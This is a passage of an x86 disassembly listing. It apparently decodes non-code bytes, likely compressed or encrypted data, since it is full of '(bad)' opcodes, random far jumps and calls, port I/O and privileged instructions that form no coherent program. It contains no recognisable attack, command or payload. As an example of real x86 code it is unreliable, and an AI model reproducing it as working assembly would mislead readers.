  433170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433171:	cmp    al,0xb7
  433173:	xor    DWORD PTR [esi-0x14ace0cc],edi
  433179:	out    dx,al
  43317a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43317b:	aaa    
  43317c:	xor    DWORD PTR [ebx],eax
  43317e:	inc    esi
  43317f:	call   FWORD PTR [eax-0x89029f3]
  433185:	mov    eax,0xac6c2d66
  43318a:	inc    edi
  43318b:	inc    esp
  43318c:	retf   
  43318d:	inc    edx
  43318e:	adc    DWORD PTR [ecx+0x50],edi
  433191:	add    cl,BYTE PTR [ebp+ebp*2+0x21]
  433195:	mov    dh,0xa6
  433197:	inc    ecx
  433198:	mov    bl,BYTE PTR [eax+0x247cef5d]
  43319e:	jnp    0x4331aa
  4331a0:	mov    ah,0x5
  4331a2:	mov    bl,BYTE PTR gs:[ebx+ebx*8+0x4c]
  4331a7:	aad    0xf7
  4331a9:	fs out 0xc6,al
  4331ac:	out    dx,eax
  4331ad:	push   esi
  4331ae:	repz add DWORD PTR [edi+0x21489491],ecx
  4331b5:	call   0x2c71d7af
  4331ba:	daa    
  4331bb:	xlat   BYTE PTR ds:[ebx]
  4331bc:	jb     0x43322b
  4331be:	dec    ebx
  4331bf:	mov    dh,BYTE PTR [ecx-0xb9002ab]
  4331c5:	ret    
  4331c6:	into   
  4331c7:	aam    0x8f
  4331c9:	bound  edi,QWORD PTR [ebx-0x79d1806c]
  4331cf:	icebp  
  4331d0:	rol    DWORD PTR [ebx],0xee
  4331d3:	fisub  WORD PTR [ecx-0x1298a6a9]
  4331d9:	repnz bound ebx,QWORD PTR [ebx]
  4331dc:	js     0x43324d
  4331de:	xchg   ebp,eax
  4331df:	add    eax,0xf51ff8cb
  4331e4:	fdiv   DWORD PTR [esi+0x40]
  4331e7:	mov    esp,0xd5b64806
  4331ec:	pop    es
  4331ed:	push   ebp
  4331ee:	dec    ecx
  4331ef:	lea    ecx,[ecx-0x48170cea]
  4331f5:	ja     0x43320b
  4331f7:	(bad)  [ecx-0x5b9036b2]
  4331fd:	and    eax,0x276299f8
  433202:	dec    edi
  433203:	push   ebp
  433204:	loopne 0x433266
  433206:	int    0x1a
  433208:	mov    ecx,0x674fb676
  43320d:	sbb    DWORD PTR [edi],0xffffffab
  433210:	in     al,0x24
  433212:	or     DWORD PTR [eax+eiz*4+0x2],edi
  433216:	stos   BYTE PTR es:[edi],al
  433217:	pusha  
  433218:	popf   
  433219:	mov    dl,0x6d
  43321b:	leave  
  43321c:	pop    ebx
  43321d:	mov    edi,0xb189f1f
  433222:	dec    ecx
  433223:	aaa    
  433224:	sub    dl,al
  433226:	ds aam 0x1c
  433229:	mov    ebp,ecx
  43322b:	dec    esi
  43322c:	lds    ecx,FWORD PTR [esp+ecx*2+0xd578ee8]
  433233:	hlt    
  433234:	sub    BYTE PTR [ebx-0x4a49fa8b],ch
  43323a:	dec    ecx
  43323b:	aam    0x45
  43323d:	iret   
  43323e:	inc    esp
  43323f:	dec    esp
  433240:	dec    edx
  433241:	and    al,0xd8
  433243:	daa    
  433244:	mov    BYTE PTR [ecx+0x3e],ch
  433247:	(bad)  
  433248:	shr    BYTE PTR [edx+0x1a],1
  43324b:	ret    0x5ac
  43324e:	(bad)  
  433250:	sbb    DWORD PTR [edi],0x1
  433253:	ds xchg ebp,eax
  433255:	enter  0xe527,0x89
  433259:	jae    0x43325a
  43325b:	and    BYTE PTR [eax],al
  43325d:	cwde   
  43325e:	mov    ebx,0x96037261
  433263:	add    eax,0xfb17e153
  433268:	cmp    DWORD PTR [edx],edx
  43326a:	pop    ds
  43326b:	add    DWORD PTR [eax+0x68],esp
  43326e:	pop    ebp
  43326f:	cs repnz adc al,0xe7
  433273:	aam    0x56
  433275:	test   al,0xbe
  433277:	pushf  
  433278:	pop    edi
  433279:	ss lock mov bh,0x89
  43327d:	cmp    eax,0xb8c8d5ae
  433282:	test   al,0xaf
  433284:	outs   dx,DWORD PTR ds:[esi]
  433285:	in     eax,0x20
  433287:	das    
  433288:	mov    edi,0x5b77ca05
  43328d:	int3   
  43328e:	xor    ebp,esi
  433290:	cs dec ebx
  433292:	pop    ds
  433293:	cmp    DWORD PTR [edx+edi*8+0x21],ebx
  433297:	ss lds ebx,FWORD PTR es:[edi+0x232aaed5]
  43329f:	xchg   ecx,eax
  4332a0:	add    ah,bh
  4332a2:	mov    BYTE PTR [edx+0x5b],cl
  4332a5:	(bad)  [esp+edx*8-0x67794157]
  4332ac:	jmp    0x6c1cf09e
  4332b1:	add    ah,BYTE PTR [edx*2+0x5f3a8484]
  4332b8:	mov    cl,0xb9
  4332ba:	call   0x8840:0x8f0ffe03
  4332c1:	adc    DWORD PTR [ecx-0x4e],ebx
  4332c4:	shl    BYTE PTR [ecx],0x6a
  4332c7:	(bad)  
  4332c8:	stos   BYTE PTR es:[edi],al
  4332c9:	add    eax,0xb734ef12
  4332ce:	sbb    ebx,ecx
  4332d0:	(bad)  
  4332d2:	pusha  
  4332d3:	jno    0x4332d7
  4332d5:	rcr    BYTE PTR [ecx],0xe2
  4332d8:	hlt    
  4332d9:	ja     0x4332f5
  4332db:	xlat   BYTE PTR ds:[ebx]
  4332dc:	enter  0x301,0x5c
  4332e0:	dec    eax
  4332e1:	pop    edx
  4332e2:	js     0x433329
  4332e4:	mov    DWORD PTR [ebp+0xef5f3aa],edx
  4332ea:	pop    edx
  4332eb:	or     DWORD PTR [ecx-0x35],ebp
  4332ee:	mov    esi,ebx
  4332f0:	mov    BYTE PTR [ebx+0x23d76578],ah
  4332f6:	cwde   
  4332f7:	mov    esp,0xbb0803f1
  4332fc:	retf   0x244d
  4332ff:	aam    0xe4
  433301:	jge    0x4332e5
  433303:	pop    edx
  433304:	inc    ebp
  433305:	clc    
  433306:	retf   
  433307:	leave  
  433308:	(bad)  
  433309:	inc    BYTE PTR [eax+0x5c]
  43330c:	(bad)  
  43330d:	mov    esi,0x6094a069
  433312:	jp     0x433369
  433314:	add    cl,BYTE PTR [ebp-0x16]
  433317:	mov    esi,0xf0435389
  43331c:	or     eax,0x5fb45c45
  433321:	icebp  
  433322:	jns    0x433364
  433324:	int    0xcf
  433326:	pop    ds
  433327:	int    0x32
  433329:	dec    ecx
  43332a:	sti    
  43332b:	xchg   esi,eax
  43332c:	mov    ch,0x1
  43332e:	dec    edi
  43332f:	arpl   WORD PTR [ecx+0x9],dx
  433332:	nop
  433333:	bnd ret 
  433335:	inc    esi
  433336:	js     0x4332c9
  433338:	lahf   
  433339:	add    eax,0xc7c19a40
  43333e:	mov    ebx,0x14df88d7
  433343:	mov    al,BYTE PTR [eax+0x14]
  433346:	int    0x24
  433348:	fimul  WORD PTR [esi+0x4a7f952d]
  43334e:	jb     0x433374
  433350:	and    BYTE PTR [edx],al
  433352:	int3   
  433353:	mov    ebp,0xb4c948f5
  433358:	lods   eax,DWORD PTR ds:[esi]
  433359:	add    esi,DWORD PTR [eax-0x4f7a58d7]
  43335f:	pop    esp
  433360:	scas   al,BYTE PTR es:[edi]
  433361:	fldcw  WORD PTR [ecx-0x6cdaf42c]
  433367:	fst    DWORD PTR [ebp+0x1dd1f2c]
  43336d:	ja     0x4333d5
  43336f:	lahf   
  433370:	adc    al,0x8a
  433372:	push   ecx
  433373:	mov    eax,0x37cd6eae
  433378:	or     BYTE PTR [edi-0x27f3847e],al
  43337e:	pop    ds
  43337f:	sti    
  433380:	ret    0x3574
  433383:	xchg   bl,ah
  433385:	pop    esp
  433386:	pop    ss
  433387:	jp     0x4333cd
  433389:	cmp    al,BYTE PTR [esi]
  43338b:	sbb    BYTE PTR [ecx+0x73e5931b],cl
  433391:	test   eax,0x5b31f729
  433396:	out    dx,al
  433397:	jns    0x43334f
  433399:	add    ch,BYTE PTR [edx]
  43339b:	jae    0x433380
  43339d:	mov    ebp,0xe7a543b0
  4333a2:	inc    ebx
  4333a3:	or     eax,0x542ba996
  4333a8:	sti    
  4333a9:	adc    ebp,DWORD PTR [esi-0x62]
  4333ac:	push   cs
  4333ad:	add    bl,al
  4333af:	or     bh,BYTE PTR [eax]
  4333b1:	mov    ds:0xc384f3da,eax
  4333b6:	cmp    esp,DWORD PTR [ecx-0x77]
  4333b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4333ba:	cld    
  4333bb:	mov    dl,BYTE PTR [eax]
  4333bd:	iret   
  4333be:	lahf   
  4333bf:	ret    0xdec
  4333c2:	loop   0x433398
  4333c4:	jns    0x433435
  4333c6:	ja     0x43339f
  4333c8:	inc    eax
  4333c9:	pop    edx
  4333ca:	leave  
  4333cb:	sub    DWORD PTR [edi-0x1f0bfc85],ebx
  4333d1:	add    eax,0xa874c2af
  4333d6:	addr16 aad 0xfd
  4333d9:	shl    BYTE PTR [ebx+eax*2+0x78],cl
  4333dd:	sbb    ebx,ebx
  4333df:	out    dx,eax
  4333e0:	mov    DWORD PTR [ebp-0xa],ecx
  4333e3:	adc    eax,0xb6ef029d
  4333e8:	jne    0x4333ec
  4333ea:	dec    esi
  4333eb:	dec    esp
  4333ec:	gs popa 
  4333ee:	cmp    al,bh
  4333f0:	xchg   esp,eax
  4333f1:	push   esi
  4333f2:	push   ds
  4333f3:	(bad)  
  4333f5:	pop    ss
  4333f6:	dec    DWORD PTR [ecx-0x33]
  4333f9:	cmp    ecx,esp
  4333fb:	pop    ecx
  4333fc:	or     eax,0x5f1e6090
  433401:	scas   eax,DWORD PTR es:[edi]
  433402:	test   al,0x27
  433404:	dec    edx
  433405:	les    esp,FWORD PTR [eax+0x5d]
  433408:	push   ebp
  433409:	xlat   BYTE PTR ds:[ebx]
  43340a:	inc    ecx
  43340b:	or     esi,ebp
  43340d:	mov    edi,0x63c2d5be
  433412:	pusha  
  433413:	adc    DWORD PTR [edx-0xa],0xfb57730d
  43341a:	dec    esi
  43341b:	call   0xe68e:0x2c87c381
  433422:	adc    eax,0x9d6d3dd7
  433427:	das    
  433428:	(bad)  
  433429:	push   ebp
  43342a:	push   ds
  43342b:	xchg   ebp,eax
  43342c:	stos   DWORD PTR es:[edi],eax
  43342d:	(bad)  
  43342e:	in     al,0x3e
  433430:	adc    esp,ecx
  433432:	pusha  
  433433:	sbb    al,0x69
  433435:	shl    BYTE PTR [eax-0x1f],1
  433438:	mov    ds:0x4d4d42bd,eax
  43343d:	jmp    0x531e:0x7a4831ac
  433444:	out    dx,eax
  433445:	outs   dx,BYTE PTR ds:[esi]
  433446:	mov    WORD PTR [ecx+0x2ff002bc],cs
  43344c:	inc    esi
  43344d:	lods   eax,DWORD PTR ds:[esi]
  43344e:	mov    cl,0x2d
  433450:	pop    ecx
  433451:	frstor [ebp+ebx*2-0x5]
  433455:	(bad)  
  433457:	pop    ds
  433458:	outs   dx,DWORD PTR ds:[esi]
  433459:	adc    BYTE PTR [esi-0x2a],0x6a
  43345d:	or     ebx,DWORD PTR [edi-0x30]
  433460:	cmp    al,0x32
  433462:	das    
  433463:	daa    
  433464:	fst    DWORD PTR [edi+ebx*8+0x6985b5a6]
  43346b:	das    
  43346c:	push   es
  43346d:	scas   eax,DWORD PTR es:[edi]
  43346e:	lock out 0x89,eax
  433471:	dec    ebx
  433472:	dec    ebp
  433473:	cmp    al,0xf8
  433475:	cld    
  433476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433477:	aad    0x2a
  433479:	retf   
  43347a:	cmp    DWORD PTR [ebx],esi
  43347c:	mov    DWORD PTR [edi+eiz*1+0x1a53b7a4],ecx
  433483:	lods   eax,DWORD PTR ds:[esi]
  433484:	mov    esp,ebp
  433486:	fs into 
  433488:	xchg   edx,eax
  433489:	xchg   DWORD PTR [edi-0x53a7e651],eax
  43348f:	jmp    eax
  433491:	sbb    bh,dl
  433493:	mov    ebx,0x82e10174
  433498:	sbb    BYTE PTR [eax],0x62
  43349b:	std    
  43349c:	and    ch,ah
  43349e:	pop    ecx
  43349f:	popf   
  4334a0:	enter  0x1e29,0xab
  4334a4:	fidiv  DWORD PTR [esi]
  4334a6:	mov    esi,0xc84a0985
  4334ab:	imul   ecx,ebp,0xffffff85
  4334ae:	mov    esp,0x8eb653c8
  4334b3:	popa   
  4334b4:	mov    bh,0xe9
  4334b6:	mov    ebp,0x4ba808af
  4334bb:	and    ch,dh
  4334bd:	xor    bl,BYTE PTR [edx-0x2c]
  4334c0:	inc    eax
  4334c1:	xchg   dl,dh
  4334c3:	cmp    DWORD PTR [ebp-0x761114ea],ecx
  4334c9:	dec    ebx
  4334ca:	inc    ebx
  4334cb:	jno    0x433464
  4334cd:	test   al,0xe8
  4334cf:	cmp    ch,BYTE PTR [eax-0x662901d9]
  4334d5:	(bad)  [eax+0x72]
  4334d8:	xchg   ecx,eax
  4334d9:	gs mov esp,0x838f8845
  4334df:	(bad)  [edi+0x6ca75d12]
  4334e5:	add    bl,BYTE PTR [eax]
  4334e7:	mov    eax,ds:0xbf44e86b
  4334ec:	aad    0x71
  4334ee:	pop    ds
  4334ef:	gs data16 js 0x43351a
  4334f3:	pop    edi
  4334f4:	aam    0x72
  4334f6:	add    al,0xd4
  4334f8:	rcl    DWORD PTR [esi+0x41],0xfb
  4334fc:	icebp  
  4334fd:	push   edi
  4334fe:	fstp   QWORD PTR [edi+0x1633af88]
  433504:	daa    
  433505:	repnz mov al,ds:0xca1d5fe9
  43350b:	pushf  
  43350c:	out    dx,al
  43350d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43350e:	test   BYTE PTR [eax],al
  433510:	sub    DWORD PTR [ebp+0x3b87dc5a],edx
  433516:	mov    ebx,0xf19e7d8b
  43351b:	sbb    ecx,DWORD PTR [eax+0x9f24f78]
  433521:	in     eax,dx
  433522:	pusha  
  433523:	lds    ebx,FWORD PTR [edx+0x61]
  433526:	and    BYTE PTR [eax-0x5e],0x1d
  43352a:	ins    BYTE PTR es:[edi],dx
  43352b:	sahf   
  43352c:	dec    esp
  43352d:	and    DWORD PTR [esi],esi
  43352f:	xlat   BYTE PTR ds:[ebx]
  433530:	in     eax,0x9f
  433532:	or     ebx,edx
  433534:	jecxz  0x43358b
  433536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433537:	inc    ebp
  433538:	xchg   ebx,eax
  433539:	dec    ebp
  43353a:	push   ds
  43353b:	jnp    0x43353e
  43353d:	sbb    cl,bl
  43353f:	out    dx,al
  433540:	push   ecx
  433541:	add    dh,BYTE PTR [eax+ecx*2+0xb4c765]
  433548:	sub    DWORD PTR [ecx],ecx
  43354a:	pop    ds
  43354b:	pop    ebx
  43354c:	clc    
  43354d:	aas    
  43354e:	cli    
  43354f:	jmp    0x6641eccf
  433554:	push   0x81d4db58
  433559:	paddq  mm3,QWORD PTR [edi+0x141ddf92]
  433560:	xor    BYTE PTR [edx],cl
  433562:	mov    bl,0xd5
  433564:	or     al,0xeb
  433566:	ss aad 0xec
  433569:	inc    edi
  43356a:	push   es
  43356b:	lods   eax,DWORD PTR ds:[esi]
  43356c:	lods   al,BYTE PTR ds:[esi]
  43356d:	ins    BYTE PTR es:[edi],dx
  43356e:	sub    dh,BYTE PTR [edx+ebp*2+0x61]
  433572:	jle    0x4335cc
  433574:	xchg   edx,eax
  433575:	dec    esi
  433576:	push   edi
  433577:	arpl   cx,cx
  433579:	hlt    
  43357a:	pusha  
  43357b:	sbb    DWORD PTR ds:0x4719cdf,ecx
  433581:	add    bl,BYTE PTR [esi-0x1ea42cfe]
  433587:	test   al,0x69
  433589:	aam    0x60
  43358b:	(bad)  
  43358c:	cli    
  43358d:	adc    BYTE PTR [ebx],bh
  43358f:	sbb    cl,BYTE PTR [ecx+ebp*8]
  433592:	jae    0x433569
  433594:	push   cs
  433595:	es sbb eax,0xa7b83f6
  43359b:	ds pop ecx
  43359d:	retf   
  43359e:	add    edi,DWORD PTR [edi]
  4335a0:	mov    fs,WORD PTR [ebp+0x5fcef42]
  4335a6:	mov    eax,DWORD PTR [edi+0x58]
  4335a9:	rcl    bh,1
  4335ab:	dec    esp
  4335ac:	inc    eax
  4335ad:	add    esi,DWORD PTR [eax-0x61]
  4335b0:	sbb    al,0x7a
  4335b2:	in     al,dx
  4335b3:	in     al,0x75
  4335b5:	inc    esp
  4335b6:	push   ss
  4335b7:	popf   
  4335b8:	mov    BYTE PTR [ebx-0x38],dh
  4335bb:	jmp    0x75bd:0xfb8fbed9
  4335c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4335c3:	lods   al,BYTE PTR ds:[esi]
  4335c4:	mov    BYTE PTR [edi-0x2d2ce0ab],bh
  4335ca:	and    ah,ah
  4335cc:	mov    dl,BYTE PTR [ecx+0x67]
  4335cf:	retf   
  4335d0:	out    dx,eax
  4335d1:	push   ebp
  4335d2:	lock addr16 call 0x77177e2a
  4335d9:	add    esi,esp
  4335db:	mov    ah,0xb9
  4335dd:	mov    esi,0x2f89086d
  4335e2:	outs   dx,DWORD PTR ds:[esi]
  4335e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4335e4:	lods   eax,DWORD PTR ds:[esi]
  4335e5:	mov    ah,0x9b
  4335e7:	mov    bh,0x88
  4335e9:	adc    al,0xb8
  4335eb:	cmp    eax,DWORD PTR [ebp-0x57]
  4335ee:	cmp    edx,esp
  4335f0:	je     0x43357e
  4335f2:	jl     0x433591
  4335f4:	mov    ebx,edx
  4335f6:	pushf  
  4335f7:	dec    esp
  4335f8:	sub    al,0x1
  4335fa:	add    esi,esi
  4335fc:	call   0x118b30f
  433601:	retf   
  433602:	gs add eax,0xea7032ec
  433608:	mov    DWORD PTR [ebx+0x41a494a8],eax
  43360e:	and    ebp,DWORD PTR [esi+0x4e]
  433611:	add    dh,BYTE PTR [edi+eiz*4+0x2b]
  433615:	dec    edx
  433616:	add    BYTE PTR [ebx],cl
  433618:	or     DWORD PTR [ebx+0x22],esi
  43361b:	mov    edi,0x43b49589
  433620:	sti    
  433621:	into   
  433622:	fmul   QWORD PTR [ebx+ebx*4+0x2]
  433626:	inc    esi
  433627:	pop    edi
  433628:	ret    
  433629:	aas    
  43362a:	jmp    0xc153:0x8fc1ed07
  433631:	dec    ebp
  433632:	mov    al,ss:0xcea50e89
  433638:	mov    edi,0xdd5eb44e
  43363d:	adc    BYTE PTR [ecx-0x35f577e7],0x75
  433644:	ds inc eax
  433646:	scas   eax,DWORD PTR es:[edi]
  433647:	retf   
  433648:	mov    al,0x45
  43364a:	mov    edi,0x136d0315
  43364f:	mov    eax,0x338e089
  433654:	xor    BYTE PTR [edx],al
  433656:	hlt    
  433657:	push   esi
  433658:	jmp    0x6094:0xd8e7b564
  43365f:	sti    
  433660:	inc    ecx
  433661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433662:	jle    0x4336d8
  433664:	push   0xb9c9413e
  433669:	add    ah,al
  43366b:	sbb    al,0xb4
  43366d:	sbb    al,0x46
  43366f:	and    eax,0xf71e1765
  433674:	xchg   esp,eax
  433675:	mov    eax,0x6bb67102
  43367a:	sub    edx,esi
  43367c:	and    edx,edx
  43367e:	or     eax,esi
  433680:	xor    ch,bl
  433682:	jne    0x433666
  433684:	mov    DWORD PTR [esi+0x5e],ebx
  433687:	fimul  DWORD PTR [esi+0x7e752d3d]
  43368d:	jbe    0x4336e7
  43368f:	push   ebp
  433690:	sbb    al,0xc6
  433692:	(bad)  
  433693:	imul   BYTE PTR [eax]
  433695:	sbb    eax,0x149bf965
  43369a:	xchg   edx,eax
  43369b:	or     ch,BYTE PTR [ebx-0x55]
  43369e:	or     edx,esp
  4336a0:	pop    ds
  4336a1:	imul   edx,edi,0x1
  4336a4:	mov    DWORD PTR [ebx],ecx
  4336a6:	xor    DWORD PTR [esi-0x1f],edi
  4336a9:	rol    BYTE PTR gs:[ebx-0x39],0x5
  4336ae:	enter  0x4668,0xf2
  4336b2:	data16 clc 
  4336b4:	adc    BYTE PTR [esi+0x7b],dl
  4336b7:	ret    
  4336b8:	mov    ah,BYTE PTR [ecx-0x7]
  4336bb:	(bad)  
  4336bc:	mov    BYTE PTR [eax+0x2b3b04dd],cl
  4336c2:	test   BYTE PTR [edx-0x6407fdcb],0x21
  4336c9:	xchg   ebx,eax
  4336ca:	ins    DWORD PTR es:[edi],dx
  4336cb:	and    bh,BYTE PTR [eax+0x54160f2]
  4336d1:	add    al,0xc2
  4336d3:	int3   
  4336d4:	adc    bh,ah
  4336d6:	push   0x47ab0ed4
  4336db:	dec    edi
  4336dc:	bound  esp,QWORD PTR [esi-0x3b]
  4336df:	mov    edi,0xd4a299fd
  4336e4:	jo     0x4336e4
  4336e6:	test   eax,0x56dac5b6
  4336eb:	inc    ecx
  4336ec:	add    ecx,eax
  4336ee:	pop    ds
  4336ef:	dec    edx
  4336f0:	xor    eax,0xcfc5f18d
  4336f5:	cmp    ebx,DWORD PTR [ebp-0x41]
  4336f8:	ds out 0x9f,al
  4336fb:	jo     0x433713
  4336fd:	push   esp
  4336fe:	push   ebp
  4336ff:	dec    ebx
  433700:	adc    DWORD PTR [ebx],eax
  433702:	cs dec eax
  433704:	dec    eax
  433705:	aam    0xe2
  433707:	xlat   BYTE PTR ds:[ebx]
  433708:	stc    
  433709:	mov    esp,0x3c3c4f64
  43370e:	and    eax,0x669eeb62
  433713:	fisttp DWORD PTR [ecx+0xc37769b]
  433719:	bound  ebx,QWORD PTR [esi]
  43371b:	xchg   edi,eax
  43371c:	(bad)  
  43371d:	mov    edi,0xf196b757
  433722:	push   ds
  433723:	aam    0xeb
  433725:	call   0xd431:0xc2b58bc0
  43372c:	mov    edi,ecx
  43372e:	xchg   esi,eax
  43372f:	push   ss
  433730:	hlt    
  433731:	cmp    DWORD PTR [eax],ebx
  433733:	cdq    
  433734:	xchg   esp,eax
  433735:	add    eax,0x132e54f2
  43373a:	adc    al,0x37
  43373c:	sbb    dh,BYTE PTR [esi+0x1e]
  43373f:	stc    
  433740:	(bad)  
  433741:	adc    edi,DWORD PTR [edx+0x4ec5a19]
  433747:	aam    0xe8
  433749:	mov    ds:0xf2a8889f,al
  43374e:	pop    ebx
  43374f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433750:	sbb    ah,al
  433752:	xchg   ah,dl
  433754:	aam    0xeb
  433756:	dec    eax
  433757:	xchg   ecx,eax
  433758:	fsub   QWORD PTR [edi+0x3d7bd252]
  43375e:	xor    ah,BYTE PTR [esi+eiz*1]
  433761:	je     0x433762
  433763:	mov    dh,0xc6
  433765:	popf   
  433766:	adc    BYTE PTR [edi-0x79],bh
  433769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43376a:	mov    cl,0x17
  43376c:	and    eax,0x3c2cff43
  433771:	or     DWORD PTR [edx+0x6f820dd4],eax
  433777:	retf   0x4a18
  43377a:	adc    ah,ah
  43377c:	mov    DWORD PTR [ecx-0x1320d674],ebx
  433782:	int3   
  433783:	xor    esp,eax
  433785:	add    bl,al
  433787:	or     DWORD PTR [edi+0x1ef923e3],esi
  43378d:	fidivr DWORD PTR [eax+0x17]
  433790:	pop    ds
  433791:	add    eax,0x2c471c9
  433796:	xchg   edx,eax
  433797:	js     0x4337e2
  433799:	push   cs
  43379a:	mov    dh,0xa3
  43379c:	sub    DWORD PTR [eax],esi
  43379e:	jl     0x433723
  4337a0:	sub    ah,BYTE PTR [eax]
  4337a2:	retf   
  4337a3:	adc    eax,0xba95c74e
  4337a8:	rol    BYTE PTR [edx],0x14
  4337ab:	clc    
  4337ac:	adc    eax,0xb42cbeb4
  4337b1:	fsub   DWORD PTR [eax+0x35]
  4337b4:	(bad)  [ecx-0x3894039]
  4337ba:	push   ss
  4337bb:	xlat   BYTE PTR ds:[ebx]
  4337bc:	adc    DWORD PTR ds:0xbeb0975d,edx
  4337c2:	dec    eax
  4337c3:	mov    eax,0x251e3c76
  4337c8:	(bad)  
  4337c9:	jge    0x433823
  4337cb:	and    ch,BYTE PTR [ecx+0x6e]
  4337ce:	cwde   
  4337cf:	inc    ebp
  4337d0:	imul   esp,DWORD PTR [eax-0x67760664],0x21
  4337d7:	daa    
  4337d8:	or     al,0x6e
  4337da:	mov    cl,0xcb
  4337dc:	mov    cl,0xaf
  4337de:	dec    esi
  4337df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4337e0:	sub    al,0xb
  4337e2:	pop    ds
  4337e3:	adc    DWORD PTR [edi],edx
  4337e5:	jno    0x433842
  4337e7:	outs   dx,DWORD PTR ds:[esi]
  4337e8:	xchg   esp,eax
  4337e9:	add    bl,BYTE PTR [esp+edx*2-0x17]
  4337ed:	mov    eax,ds:0xdeeff0d9
  4337f2:	pusha  
  4337f3:	out    dx,eax
  4337f4:	iret   
  4337f5:	mov    dh,0xc6
  4337f7:	aam    0xaf
  4337f9:	jmp    0xb14a:0x211cab7
  433800:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  433802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433803:	inc    ebp
  433804:	fild   DWORD PTR [edi+0x19be311f]
  43380a:	test   BYTE PTR [ecx-0x28d8996e],bh
  433810:	and    eax,0xace0c044
  433815:	jl     0x433886
  433817:	cmc    
  433818:	(bad)  
  433819:	addr16 sti 
  43381b:	pop    ecx
  43381c:	iret   
  43381d:	add    dh,BYTE PTR [edx+edi*1]
  433820:	xchg   BYTE PTR [ebx],al
  433822:	test   al,0x3
  433824:	pop    es
  433825:	add    bl,al
  433827:	jmp    0x191c41fc
  43382c:	out    dx,al
  43382d:	inc    edx
  43382e:	push   ds
  43382f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433830:	mov    al,0x5a
  433832:	inc    ecx
  433833:	cmp    BYTE PTR [esi],ch
  433835:	jge    0x433819
  433837:	xlat   BYTE PTR ds:[ebx]
  433838:	mov    ebx,0x62c19d2f
  43383d:	jno    0x433810
  43383f:	sub    eax,0xc91f368a
  433844:	(bad)  
  433845:	lock mov eax,es:0xd428f7a2
  43384c:	retf   0xaaa8
  43384f:	jb     0x4338c6
  433851:	mov    ecx,0xe394fc11
  433856:	ret    
  433857:	ss pop ebx
  433859:	ret    0x7f95
  43385c:	push   eax
  43385d:	iret   
  43385e:	pop    edx
  43385f:	aam    0xd0
  433861:	fisttp DWORD PTR [ecx-0x12404cd7]
  433867:	loop   0x4337f2
  433869:	mov    ecx,0xf4f3f883
  43386e:	push   esp
  43386f:	pop    ebp
  433870:	mov    cl,0xb5
  433872:	test   DWORD PTR [ecx-0x2ba2425c],eax
  433878:	dec    esp
  433879:	mov    ah,0x55
  43387b:	mov    eax,ds:0xc96d4075
  433880:	call   0x6412:0xa9e76a80
  433887:	jnp    0x43384c
  433889:	add    ah,BYTE PTR [esi]
  43388b:	stc    
  43388c:	cli    
  43388d:	xchg   esi,eax
  43388e:	xor    eax,0x60f3ce80
  433893:	dec    edi
  433894:	je     0x4338d2
  433896:	ret    0x853a
  433899:	in     eax,dx
  43389a:	mov    esi,0xfb0fffc1
  43389f:	xchg   esp,eax
  4338a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4338a1:	ss ror ebp,0x49
  4338a5:	add    al,0x7f
  4338a7:	inc    esp
  4338a8:	stc    
  4338a9:	sub    eax,0x5f6a8064
  4338ae:	fwait
  4338af:	in     al,0x38
  4338b1:	xchg   ebx,eax
  4338b2:	sub    BYTE PTR [eax-0x2cc73a77],bh
  4338b8:	xchg   edx,eax
  4338b9:	gs cmp eax,0xb201ae51
  4338bf:	loope  0x433914
  4338c1:	sub    eax,0x6349c195
  4338c6:	add    DWORD PTR [ebp-0x16e0a19a],esi
  4338cc:	or     eax,DWORD PTR [edx-0xc1df971]
  4338d2:	loop   0x4338a8
  4338d4:	pop    edi
  4338d5:	in     eax,dx
  4338d6:	cmp    eax,0xc113ee05
  4338db:	mov    ah,0x89
  4338dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4338de:	pop    edi
  4338df:	inc    esi
  4338e0:	mov    esp,0x235d1dd4
  4338e5:	xchg   cl,bh
  4338e7:	ins    BYTE PTR es:[edi],dx
  4338e8:	mul    BYTE PTR [eax]
  4338ea:	jl     0x4338b0
  4338ec:	pop    edx
  4338ed:	mov    ebx,0x344a2ba0
  4338f2:	scas   eax,DWORD PTR es:[edi]
  4338f3:	sahf   
  4338f4:	mov    ecx,esp
  4338f6:	scas   al,BYTE PTR es:[edi]
  4338f7:	mov    eax,ds:0xd5178931
  4338fc:	jns    0x433901
  4338fe:	in     al,0x0
  433900:	lea    edx,[ecx-0x1a]
  433903:	nop    DWORD PTR [edi+0x1f]
  433907:	and    eax,0xb8815155
  43390c:	enter  0xf114,0xd5
  433910:	in     al,dx
  433911:	mov    esp,0xb6bc9667
  433916:	js     0x4338fa
  433918:	mov    ecx,ebp
  43391a:	dec    esp
  43391b:	cs dec ebx
  43391d:	js     0x43395b
  43391f:	imul   BYTE PTR [ecx]
  433921:	xchg   ecx,eax
  433922:	enter  0x1542,0x4b
  433926:	push   ds
  433927:	scas   al,BYTE PTR es:[edi]
  433928:	add    bh,bh
  43392a:	gs dec edi
  43392c:	aaa    
  43392d:	shl    DWORD PTR [eax+0x59],0x59
  433931:	popf   
  433932:	mov    al,ds:0x30ebb64b
  433937:	(bad)  
  433938:	jnp    0x433931
  43393a:	fist   WORD PTR [ebx]
  43393c:	xor    al,0x6d
  43393e:	mov    esi,0xa7e154ce
  433943:	fdiv   QWORD PTR [eax]
  433945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433946:	popa   
  433947:	adc    DWORD PTR [ecx+0x45],ebp
  43394a:	outs   dx,DWORD PTR ds:[esi]
  43394b:	fdiv   st(0),st
  43394d:	sbb    al,ah
  43394f:	and    al,0x8
